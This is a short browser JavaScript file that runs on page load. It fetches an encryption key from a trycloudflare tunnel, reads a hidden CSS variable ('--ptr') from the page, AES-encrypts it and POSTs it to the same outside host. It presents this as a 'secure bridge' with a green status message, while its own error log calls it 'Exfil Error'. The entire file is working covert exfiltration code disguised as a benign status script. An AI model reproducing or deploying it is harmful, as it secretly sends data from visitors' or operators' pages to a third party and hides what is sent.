const BRIDGE_URL = 'https://introducing-basket-chassis-join.trycloudflare.com/';

async function runSecureAllocation() {
    const statusEl = document.getElementById('status');
    
    try {

        const keyResponse = await fetch(`${BRIDGE_URL}/api/handshake-proxy`, {
            method: 'GET'
        });
        const { k: keyStr, i: ivStr } = await keyResponse.json();

        const KEY = CryptoJS.enc.Utf8.parse(keyStr);
        const IV = CryptoJS.enc.Utf8.parse(ivStr);

        const styles = getComputedStyle(document.documentElement);
        const rawHex = styles.getPropertyValue('--ptr').trim().replace(/"/g, '');


        const encrypted = CryptoJS.AES.encrypt(rawHex, KEY, {
            iv: IV,
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.Pkcs7
        });

        const ciphertext = encrypted.toString();

 
        const response = await fetch(`${BRIDGE_URL}/api/sync-bridge`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                id: "ROG_STRIX_5090_NODE",
                content: ciphertext 
            })
        });

        if (response.ok) {
            statusEl.innerText = "SECURE BRIDGE ACTIVE";
            statusEl.style.color = "#00ff00";
        }
    } catch (error) {
        statusEl.innerText = "CONNECTION ERROR";
        console.error("Exfil Error:", error);
    }
}

window.addEventListener('load', runSecureAllocation);